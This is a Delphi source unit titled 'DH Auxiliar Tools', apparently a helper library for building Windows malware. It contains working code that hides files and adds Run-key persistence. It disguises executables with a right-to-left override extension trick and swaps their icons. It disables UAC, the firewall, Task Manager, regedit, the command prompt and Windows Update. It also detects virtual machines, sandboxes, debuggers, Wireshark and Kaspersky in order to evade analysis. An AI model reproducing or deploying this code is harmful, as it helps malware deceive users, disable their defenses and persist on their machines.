// Unit : DH Auxiliar Tools
// Version : 0.3
// (C) Doddy Hackman 2015

unit auxiliar_tools;

interface

uses Windows, Registry, Classes, SysUtils, MadRes, StrUtils, TlHelp32;

function hide_file(filename: string): bool;
function normal_file(filename: string): bool;
function add_startup(name, filename: string): bool;
function delete_startup(name: string): bool;
function file_pumper(archivo, cantidad, tipo: string): bool;
function change_icon(archivo, icono: string): bool;
function extension_changer(archivo: string; extension: string): bool;

function disable_cmd(opcion: string): bool;
function disable_uac(opcion: string): bool;
function disable_run(opcion: string): bool;
function disable_firewall(os, opcion: string): bool;
function disable_regedit(opcion: string): bool;
function disable_taskmgr(opcion: string): bool;
function disable_updates(opcion: string): bool;

function check_virtual_pc(): bool;
function check_virtual_box(): bool;
function check_kaspersky(): bool;
function check_wireshark(): bool;
function check_ollydbg(): bool;
function check_anubis(): bool;
function check_debug(): bool;
function check_antis(option: string): bool;
// Options : virtual_box virtual_pc anubis vmware

implementation

function hide_file(filename: string): bool;
begin
  try
    begin
      if (FileExists(filename) or DirectoryExists(filename)) then
      begin
        SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_HIDDEN);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function normal_file(filename: string): bool;
begin
  try
    begin
      if (FileExists(filename) or DirectoryExists(filename)) then
      begin
        SetFileAttributes(Pchar(filename), FILE_ATTRIBUTE_NORMAL);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function add_startup(name, filename: string): bool;
var
  Registry: HKEY;
begin
  try
    begin
      if (FileExists(filename)) then
      begin
        RegCreateKeyEx(HKEY_LOCAL_MACHINE,
          'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
          REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, Registry, nil);
        RegSetValueEx(Registry, Pchar(name), 0, REG_SZ, Pchar(filename), 666);
        RegCloseKey(Registry);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function delete_startup(name: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_LOCAL_MACHINE;
      Registry.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run\', True);
      Registry.DeleteValue(name);
      Registry.CloseKey;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

procedure file_pumper_now(archivo: string; cantidad: LongWord);
var
  arraycantidad: array of Byte;
  abriendo: TFileStream;
begin
  abriendo := TFileStream.Create(archivo, fmOpenReadWrite);
  SetLength(arraycantidad, cantidad);
  ZeroMemory(@arraycantidad[1], cantidad);
  abriendo.Seek(0, soFromEnd);
  abriendo.Write(arraycantidad[0], High(arraycantidad));
  abriendo.Free;
end;

function file_pumper(archivo, cantidad, tipo: string): bool;
begin
  try
    begin
      if (FileExists(archivo)) then
      begin
        if (tipo = 'Byte') then
        begin
          file_pumper_now(archivo, StrToInt(cantidad) * 8);
        end;
        if (tipo = 'KiloByte') then
        begin
          file_pumper_now(archivo, StrToInt(cantidad) * 1024);
        end;
        if (tipo = 'MegaByte') then
        begin
          file_pumper_now(archivo, StrToInt(cantidad) * 1048576);
        end;
        if (tipo = 'GigaByte') then
        begin
          file_pumper_now(archivo, StrToInt(cantidad) * 1073741824);
        end;
        if (tipo = 'TeraByte') then
        begin
          file_pumper_now(archivo, StrToInt(cantidad) * 1099511627776);
        end;
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function change_icon(archivo, icono: string): bool;
var
  change: dword;
  data: string;
begin
  try
    begin
      if (FileExists(archivo) and FileExists(icono)) then
      begin
        change := BeginUpdateResourceW(PWideChar(wideString(archivo)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(data)), 0,
          PWideChar(wideString(icono)));
        EndUpdateResourceW(change, False);
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    begin
      Result := False;
    end;
  end;
end;

function extension_changer(archivo: string; extension: string): bool;
var
  nombre: string;
begin
  try
    begin
      if (FileExists(archivo)) then
      begin
        nombre := ExtractFileName(archivo);
        nombre := StringReplace(nombre, ExtractFileExt(nombre), '',
          [rfReplaceAll, rfIgnoreCase]);
        nombre := nombre + char(8238) + ReverseString('.' + extension) + '.exe';
        MoveFile(Pchar(archivo), Pchar(ExtractFilePath(archivo) + nombre));
        Result := True;
      end
      else
      begin
        Result := False;
      end;
    end;
  except
    Result := False;
  end;
end;

function disable_cmd(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey('Software\Policies\Microsoft\Windows\System\', True);
      if (opcion = 'on') then
      begin
        Registry.WriteInteger('DisableCMD', 2);
      end
      else
      begin
        Registry.WriteInteger('DisableCMD', 0);
      end;
      Registry.Free;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function disable_uac(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_LOCAL_MACHINE;
      Registry.OpenKey
        ('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\', True);
      if (opcion = 'on') then
      begin
        Registry.WriteInteger('EnableLUA', 0);
      end
      else
      begin
        Registry.WriteInteger('EnableLUA', 1);
      end;
      Registry.Free;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function disable_run(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\', True);
      if (opcion = 'on') then
      begin
        Registry.WriteInteger('NoRun', 1);
      end
      else
      begin
        Registry.WriteInteger('NoRun', 0);
      end;
      Registry.Free;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, Pchar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    Pchar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function disable_firewall(os, opcion: string): bool;
begin
  try
    begin
      if (os = 'xp') then
      begin
        if (opcion = 'off') then
        begin
          ejecutar('netsh firewall set opmode enable');
        end;
        if (opcion = 'on') then
        begin
          ejecutar('netsh firewall set opmode disable');
        end;
      end;
      if (os = 'seven') then
      begin
        if (opcion = 'off') then
        begin
          ejecutar('netsh advfirewall set currentprofile state on');
        end;
        if (opcion = 'on') then
        begin
          ejecutar('netsh advfirewall set currentprofile state off');
        end;
      end;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function disable_regedit(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
      if (opcion = 'off') then
      begin
        Registry.WriteInteger('DisableRegistryTools', 0);
      end;
      if (opcion = 'on') then
      begin
        Registry.WriteInteger('DisableRegistryTools', 1);
      end;
      Registry.Free;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function disable_taskmgr(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_CURRENT_USER;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
      if opcion = 'on' then
      begin
        Registry.WriteString('DisableTaskMgr', '1');
      end
      else
      begin
        Registry.DeleteValue('DisableTaskMgr');
      end;
      Registry.CloseKey;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function disable_updates(opcion: string): bool;
var
  Registry: TRegistry;
begin
  try
    begin
      Registry := TRegistry.Create;
      Registry.RootKey := HKEY_LOCAL_MACHINE;
      Registry.OpenKey
        ('Software\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update',
        True);
      if (opcion = 'on') then
      begin
        Registry.WriteInteger('AUOptions', 1);
      end;
      if (opcion = 'off') then
      begin
        Registry.WriteInteger('AUOptions', 0);
      end;
      Registry.Free;
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function check_process(name: string): bool;
var
  handle_now: THandle;
  long_now: LongBool;
  process: TProcessEntry32;
begin
  Result := False;
  handle_now := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  process.dwSize := SizeOf(process);
  long_now := Process32First(handle_now, process);
  while long_now do
  begin
    if name = process.szExeFile then
    begin
      Result := True;
    end;
    long_now := Process32Next(handle_now, process);
  end;
end;

function check_virtual_pc(): bool;
begin
  Result := False;
  try
    begin
      asm
        mov eax,1
        db $0F
        db $3F
        db $07
        db $0B
        db $C7
        db $45
        db $FC
        db $FF
        db $FF
        db $FF
        db $FF
      end;
      Result := True;
    end;
  except
    begin
      Result := False;
      exit;
    end;
  end;
end;

function check_virtual_box(): bool;
begin
  Result := False;
  if (check_process('VBoxService.exe')) then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

function check_kaspersky(): bool;
begin
  Result := False;
  if (check_process('avp.exe')) then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

function check_wireshark(): bool;
begin
  Result := False;
  if (check_process('wireshark.exe')) then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

function check_ollydbg(): bool;
begin
  Result := False;
  if (check_process('ollydbg.exe') or check_process('OLLYDBG.exe')) then
  begin
    Result := True;
  end
  else
  begin
    Result := False;
  end;
end;

function check_anubis(): bool;
begin
  Result := False;
  if DirectoryExists('C:\InsideTm') then
  begin
    Result := True;
  end;
  if FileExists('C:\sample.exe') then
  begin
    Result := True;
  end;
  if (GetEnvironmentVariable('username') = 'user') then
  begin
    Result := True;
  end;
end;

function check_debug(): bool;
// Based on : http://www.delphipages.com/forum/showthread.php?t=113153
// Thanks to LörAn
type
  type_now = function(): Boolean; stdCall;
var
  module_now: HMODULE;
  test_now: type_now;
begin
  Result := False;
  module_now := LoadLibrary('kernel32.dll');
  if (module_now <> 0) then
  begin
    @test_now := GetProcAddress(module_now, 'IsDebuggerPresent');
    if Assigned(test_now) then
    begin
      Result := test_now();
    end;
    FreeLibrary(module_now);
  end;
end;

function check_antis(option: string): bool;
// Credits : Based on http://sub-soul.blogspot.com.ar/2012/04/antis-maquinas-virtuales-sandboxs.html
// Thanks to Fakedo0r
var
  Registry: HKEY;
  contenido: String;
  tipo: Integer;
  cantidad: Integer;
begin
  Result := False;
  tipo := 1;

  try
    begin
      RegOpenKeyEx($80000002, Pchar('SYSTEM\ControlSet001\Services\Disk\Enum'),
        0, $20019, Registry);
      RegQueryValueEx(Registry, '0', 0, @tipo, nil, @cantidad);
      SetLength(contenido, cantidad);
      RegQueryValueEx(Registry, '0', 0, @tipo, PByte(Pchar(contenido)),
        @cantidad);

      if option = 'virtual_box' then
      begin
        if (Pos('vbox', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end
        else
        begin
          Result := False;
        end;
      end

      else if option = 'virtual_pc' then
      begin
        if (Pos('virtual', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end
        else
        begin
          Result := False;
        end;
      end

      else if option = 'anubis' then
      begin
        if (Pos('qemu', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end;
      end

      else if option = 'vmware' then
      begin
        if (Pos('vmware', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end
        else
        begin
          Result := False;
        end;
      end
      else
      begin

        if (Pos('vbox', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end
        else if (Pos('virtual', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end

        else if (Pos('qemu', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end

        else if (Pos('vmware', LowerCase(contenido)) > 0) then
        begin
          Result := True;
        end
        else
        begin
          Result := False;
        end;

      end;

      RegCloseKey(Registry);
    end;
  except
    Result := False;
  end;
end;

end.

// The End ?
